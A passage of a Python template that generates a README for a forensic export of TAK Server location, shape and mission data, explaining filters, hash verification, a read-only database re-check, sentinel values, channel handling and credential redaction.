  An object is included when ANY PART of ANY VERSION of it touches the
  bounding box. Once included, EVERY version of it in the window is written,
  so a shape that moved into or out of the area replays as a whole.

This means shapes.csv can contain an object whose anchor point - and so its
cot.csv rows - lies outside the box. That is deliberate, not an error. The
manifest's in_shapes_export column states, for every uid the server saw in
the window, whether it is in shapes.csv and if not why, exactly as
in_positional_export/exclusion_reason do for cot.csv. The two columns can
legitimately disagree for the same uid.

Deletions: a 'deleted' row gives the time the server recorded the object's
removal from its mission. The server does not record WHO removed it; that
cell reads "(not recorded)" rather than being left blank. A version's own
creator_* columns do name who drew or edited it.

AUTOMATED FEEDS
Some shapes are not drawn by anyone: software pushes them to the server (an
imported map layer, for example), and the record says so - it carries an
element the pushing software writes, which a shape drawn at a map does not.
Those shapes are left out of shapes.csv and locations.kmz unless the operator
chose to include them. What this export found and did:

{feed_block}

===============================================================================
THIS EXPORT
===============================================================================
Case / reference : {case_id}
Exported         : {datetime.now(timezone.utc).isoformat()}
Exported by      : {actor}
Requested for    : {requested_for or NOT_RECORDED}
Source           : PostgreSQL {context.get('pg_version', 'unknown')},
                   database 'cot' on the TAK Server host
Database identity: {_identity_text(context)}
DB timezone      : {context.get('db_timezone', 'unknown')}
DB snapshot      : {_snapshot_text(context)}
                   (transaction: REPEATABLE READ, READ ONLY - the server itself
                   refuses a write inside it, whatever the account could do)
DB clock         : {context.get('db_now', 'unknown')}
Tool clock       : {context.get('tool_now', 'unknown')}
Clock difference : {_skew_text(context)}
DB account       : {context.get('db_user', 'unknown')}; write privilege on cot_router:
                   {context.get('write_privs', 'unknown')}
DB structure     : {_schema_text(schema)}
Export tool      : {app_version}{(', commit ' + app_commit) if app_commit else ''}
File selection   : {selection_note}
Channel selection: {channel_note}
Automated feeds  : {feed_line}

Database at time of export
  Total position records : {context.get('db_total', 'unknown')}
  Oldest record          : {context.get('db_oldest', 'unknown')}
  Newest record          : {context.get('db_newest', 'unknown')}

TIME WINDOW (start inclusive, end exclusive)
  Start : {p['start']}
  End   : {p['end']}

  Times were supplied by the operator and interpreted by the database in the
  timezone shown above. If the window ends at or near the present moment,
  devices may still have been reporting while the export ran.

GEOGRAPHIC BOX (WGS84 / EPSG:4326, decimal degrees)
  North edge : {p['north']}
  South edge : {p['south']}
  West edge  : {p['west']}
  East edge  : {p['east']}

  A "bounding box" is a rectangle on the map. Latitude runs north-south
  (positive = north of the equator). Longitude runs east-west (negative =
  west of Greenwich, so all of the United States is negative). Any position
  inside this rectangle is included; anything outside it is not.

Bulk file transfer records (cot_type b-t-f) : excluded

===============================================================================
FILES IN THIS PACKAGE
===============================================================================

{chr(10).join(file_lines)}
===============================================================================
CHECKING THE FILES AGAINST THEIR RECORDED HASHES
===============================================================================
See {case_id}-VERIFY.txt. It is one page: the single command that checks every
file in this package at once, what to do if a line does not report OK, and
what the check does and does not show.

Opening a CSV in Excel and saving it WILL change the hash. Work on copies and
keep the originals untouched.

===============================================================================
SPOT-CHECKING THE DATA
===============================================================================
This package was produced by a tool, from a database, without human review of
individual records. It reports what the server stored. It does not attest that
what the server stored is complete or accurate. Anyone relying on it should
verify it before it is used for any consequential purpose.

To verify an individual record, note its id from the main file and run this on
the TAK Server:

    sudo -u postgres psql -d cot -c "SELECT * FROM cot_router WHERE id = <id>;"

Compare event_pt, servertime and detail against the corresponding row here.

THE ADMINISTRATOR'S RE-CHECK. This package can be checked against the server
itself, by someone who is not this tool. queries.sql holds every statement
the export ran, exactly as sent, with its values.

  The usual way - one line, nothing to copy up or down. Right after the
  export, TAK-Extract's Export page shows a command to paste on the TAK
  Server. It fetches this package's queries.sql from TAK-Extract (the same
  bytes as in this zip - its hash is in SHA256SUMS.txt), runs it with psql in
  one read-only snapshot into a folder kept for the case,

    /var/lib/takextract/recheck/{case_id}/<date-time>/

   One case can hold several exports - different areas, different channels -
   and each re-check writes into its own dated folder, so one never lands on
   another's files. The folder the Export page's line uses also carries the
   first eight characters of that package's SHA-256, which says which export
   it re-checks without opening anything.

  hashes every result, tars the folder into {case_id}-recheck.tgz, and posts
  ONLY the list of hashes back to TAK-Extract, which records it in the audit
  log and answers with a RECHECK-INFO.txt that is saved in the same folder.
  TAK-Extract never receives location data; psql, not TAK-Extract, is what
  read the database. The folder outlives the server's retention purge and is
  the evidence copy; it can be copied off with WinSCP when needed.

  By hand, from this file alone: see the HOW TO RE-RUN notes in
  queries.sql. The read-only account this export used:
  {context.get('db_user', 'see DB account above')}.

===============================================================================
WHAT THE RE-CHECK COMPARES
===============================================================================
Of the files a re-check produces, TWO are compared by hash. The rest are
recorded, not compared. Both statements are in the audit log entry and in the
RECHECK-INFO.txt saved beside the files on the server.

COMPARED BY HASH

  {case_id}-queries.sql
      The file the server ran, against the same file in this package. It
      holds every statement the export sent, rendered as sent, for every file
      in the package - including the ones that have nothing to do with the
      cot_router table. If they match, the file the server ran and the file
      in this package have the same hash.

  {case_id}-recheck-cot_router-raw.csv  against  {case_id}-cot_router-raw.csv
      Every column of the cot_router rows inside the window, box and channels
      recorded above, written by psql on the server in both cases. It is what
      cot.csv, shapes.csv, the shapes in the KMZ and the counts in
      manifest.csv were built from. If they match, the file the server wrote
      and the file in this package have the same hash.

RECORDED, NOT COMPARED

  Every other file the re-check produced. Its hash is in the re-check's hash
  file and in TAK-Extract's audit log, and the file itself stays on the
  server, where it can be compared row by row. These are not compared by
  hash, for two reasons that stack:

  1. Formatting. This tool writes CSV in Python's spelling of values; psql
     writes the server's. cot_router-raw.csv is the one file written psql's
     way deliberately, so the two sides produce the same bytes. The others
     would differ on formatting alone with identical data behind them, and a
     hash comparison would report that difference as though it meant
     something.

  2. Eight of them are not limited by time at all: missions.csv,
     mission-subs.csv, mission-contents.csv, files.csv, attachments.csv,
     video.csv, datafeeds.csv and federation.csv. That is deliberate - a
     mission created before an incident is still relevant to it - but it
     means a mission joined, or a file uploaded, between the export and the
     re-check changes those files legitimately. Equality was never the right
     test for them.

  The time-limited files are cot.csv, shapes.csv, chat.csv, connections.csv
  and mission-changes.csv.

WHEN TO RUN IT

  At export time. The rows behind even the time-limited files are eventually
  removed by the server's own retention purge, so a re-check run months later
  can return fewer rows than the export did.

On TAK-Extract's Verify & Replay page the recorded verdict shows as soon as the
package is opened; the raw recheck file itself only needs fetching for an
exact row-by-row diagnosis if the hashes differ.

Only possible while the server still holds the data - do it at export time.

Other checks worth making:
  - Confirm the parsed columns match raw_detail for the same row.
  - Cross-check a device's track against an independent source: dispatch
    records, another system's own log, the account of whoever carried it.
  - Confirm the manifest's events_inside_box for a device matches how many
    rows that device has in the main file.
  - Confirm the earliest and latest records fall inside the requested window.

Verification is only possible while the source data remains within the
server's retention window. After that the package may be the only copy, so
spot-check soon after export rather than months later.

===============================================================================
SENTINEL VALUES - THESE LOOK LIKE ERRORS BUT ARE NOT
===============================================================================
TAK devices use placeholder numbers meaning "I do not have this information".
They are not export errors and they are not measurements. This export does not
remove or alter them.

  speed = -1.0 or -1     Speed UNAVAILABLE. Does NOT mean stopped.
  speed = 0.0            Speed measured as zero - the device was STATIONARY.
                         This is a real measurement. -1.0 and 0.0 mean
                         opposite things. Do not merge them.
  course = 9999999.0
       or -1.0 / -1      Heading UNAVAILABLE. Does NOT mean due north. A
                         stationary device may also keep reporting its last
                         valid heading, so a course alongside speed 0.0 may be
                         stale rather than current.
  ce / le / hae
       >= 9999999        Accuracy or altitude UNKNOWN. Does NOT mean the fix
                         was precise or at sea level.
  latitude and longitude
       both exactly 0    No GPS fix. Excluded from the main file, counted in
                         the manifest.
  An EMPTY column        The device never sent that element at all. Different
                         from a sentinel value, which means it was sent but
                         carried nothing usable.

ONE DELIBERATE ALTERATION: a text cell that begins with = + - @ (or a tab)
is written with a leading apostrophe ('), because Excel and LibreOffice
would otherwise execute it as a formula when the file is opened. Values
that are simply numbers (-1.0, a negative longitude) are NOT changed. The
apostrophe is this export's addition, not part of the original record;
spreadsheets hide it, a text editor shows it. Callsigns, team, role,
remarks and chat text are typed by device users and are where this can
occur.

Which client software produced a record is shown in tak_platform. Different
clients report different amounts of detail and use different sentinels.

===============================================================================
COT TYPE CODES
===============================================================================
'CoT' means Cursor on Target, the message format TAK uses. cot_type is a
dotted hierarchy read left to right.

For types starting with 'a' (an "atom" - a real-world thing):

  Position 1  a  = a real-world entity
  Position 2  AFFILIATION - also sets the map icon colour and shape:
                f = friendly (blue, rectangle)   h = hostile (red, diamond)
                n = neutral  (green, square)     u = unknown (yellow)
  Position 3  DOMAIN:
                G = ground   A = air   S = sea surface   U = subsurface

Common examples:
  a-f-G-U-C      Friendly ground unit - a PERSON carrying a device. This is
                 the type to look at for personnel tracking.
  a-f-G-E-V-C    Friendly ground equipment, vehicle.
  a-f-G-I-*      Infrastructure: stations, hospitals and similar map layers.

Types NOT starting with 'a' are not devices:
  b-t-f          Bulk file transfer chunk. Excluded from this export.
  b-m-p-*        A dropped point / marker.
  t-x-d-d        A delete or tasking message. Each carries a fresh unique ID,
                 so large numbers inflate any raw count of unique IDs without
                 representing a real device. The manifest's uid_kind column
                 separates these out.
  u-d-*          User-drawn shapes: freeform, circles, measurements. A shape
                 pushed by software rather than drawn at a map carries an
                 element the software writes (<__nodered>); see AUTOMATED
                 FEEDS above for what this export did with those.

===============================================================================
CHANNELS
===============================================================================
TAK separates traffic into channels so one group of users only sees what is
meant for them. The 'channels' column gives the channel NAMES an event was
delivered to; 'channel_numbers' gives the server's internal numbers so the
values can be independently checked.

Numbering was verified against a live server rather than assumed: the internal
bit string is read from the RIGHT, and channel number 2 is the built-in
anonymous channel.

Note the difference between 'channels' and 'reported_team'. 'channels' is what
the SERVER delivered the event to, and controls who could actually see it.
'reported_team' is what the DEVICE said about itself. They usually agree, but
the server-side value is authoritative for questions about access.

CHANNEL FILTER SCOPE (see "Channel selection" above for what was applied)
A channel filter restricts a file to rows carrying at least one selected
channel. It only applies to files whose source table is itself stamped with
a channel: cot.csv, connections.csv, chat.csv, missions.csv, files.csv,
video.csv, datafeeds.csv. It does NOT apply to mission-changes.csv,
mission-subs.csv, mission-contents.csv, attachments.csv, or federation.csv -
those records have no channel of their own in this database, so a channel
filter can't narrow them; each says so in its own entry above rather than
silently including everything. manifest.csv is never narrowed by the filter
either, on purpose - it reports which devices the filter excluded instead.

===============================================================================
WHAT HAS BEEN WITHHELD OR MODIFIED, AND WHY
===============================================================================
This section exists so the completeness of the package can be judged rather
than assumed. Nothing below was withheld to shape the record. Every item is
either a credential, which has no evidentiary value and creates a security
risk if disclosed, or bulk binary content a spreadsheet cannot carry.

1. FIELDS OMITTED ENTIRELY

   Mission passwords     The stored password hash is not exported. The
                         missions file records only whether a mission was
                         password protected (yes/no).
   Subscription tokens   Mission subscriptions contain an active access
                         token. It is omitted; every other field is included.
   Data feed credentials The stored authentication secret is not exported.
                         Whether authentication was required, and of what
                         type, is included.
   Certificates and
   OAuth records         Authentication material rather than incident data.
                         Not exported in any form.

2. VALUES MODIFIED IN PLACE

   Video stream URLs     Camera addresses commonly embed a username and
                         password as protocol://user:password@address.
                         Anything between "://" and "@" has been replaced
                         with [CREDENTIALS-REDACTED], in both the url column
                         and the raw XML. The address and every other part of
                         the URL is unchanged. A URL with no embedded
                         credentials is unaltered.

                         Redaction markers in this export: {redaction_text}

                         Camera credentials are managed by the video system,
                         not by TAK, and are retained there far longer than
                         this server's window. They are available from that
                         system if genuinely required.

3. BULK CONTENT INVENTORIED RATHER THAN EMBEDDED

   Shared file contents  The files inventory lists every file with its name,
                         size, type, uploader, timestamp and SHA hash, but
                         not the bytes. The hash allows any file later
                         produced to be verified as the same one.
   Attached images       Listed with size and parent event; image data not
                         embedded.
   Video footage         No footage is held in the TAK database at all.

NOT WITHHELD, BUT WORTH STATING
   Records excluded by the time window or geographic box are not withheld -
   filtering is the purpose of the export, and the manifest accounts for every
   device active in the window regardless of the geographic filter.

   Categories of data that did not exist at export time produce empty files.
   The census below shows the live count of every relevant table at the moment
   of export, so an empty file can be distinguished from one nobody checked.

===============================================================================
LIMITS OF THIS DATA
===============================================================================
  RETENTION. The server keeps this data for a limited period before deleting
  it automatically. Anything older no longer exists and cannot be recovered by
  this or any other tool. Export promptly.

  DEVICE-DEPENDENT FIELDS. Different TAK clients report different amounts of
  detail. A blank column often means "this app does not send that", not "this
  was withheld".

  ACCURACY. Positions are GPS derived and carry an error estimate in ce_m. A
  position is a measurement with a margin of error, not an exact point.

  SERVER-SIDE ONLY. This is what the SERVER received and stored. A device that
  lost connectivity may have recorded positions locally that never reached the
  server. The connections file shows when devices were and were not connected.

  OTHER SYSTEMS. This export covers the TAK Server database. Data held by
  systems that connect to TAK - streaming servers, records management,
  dispatch - is outside its scope and must be requested from those systems.

===============================================================================
PARSED VERSUS AUTHORITATIVE COLUMNS
===============================================================================
Taken directly from database fields (authoritative):
  id, event_time, servertime, latitude, longitude, uid, ce_m, how, cot_type,
  hae_m, le_m, event_start, stale, access, opex, caveat, releaseableto,
  channels, channel_numbers, data_feed_names, attached_images

Extracted from the device's XML by pattern matching, and blank if that device
did not send the element:
  callsign, geopoint_src, reported_team, reported_role, course_deg, speed_ms,
  battery_pct, device_model, tak_platform, tak_version, remarks

raw_detail holds the complete original XML and is the authority for anything
in the second list.

===============================================================================
DATA QUALITY SUMMARY
===============================================================================
Counts within the main file (of {total} records):

{quality_lines}

DATABASE-WIDE TABLE CENSUS AT EXPORT TIME
-----------------------------------------
Taken live rather than assumed. Compare against the record counts above: a
non-zero census with an empty file indicates a problem and should be raised.

{census_lines}

A zero means that category of data did not exist at export time, not that it
was skipped.

EXPORT ERRORS
-------------
{failure_block}

===============================================================================
QUESTIONS
===============================================================================
Anything here can be re-derived from the source database while the retention
window still holds the data. The case reference, time window, bounding box
and channel selection printed above are the complete set of parameters used,
and queries.sql holds the exact statements they were bound into - re-running
that script produces the same rows.
===============================================================================
"""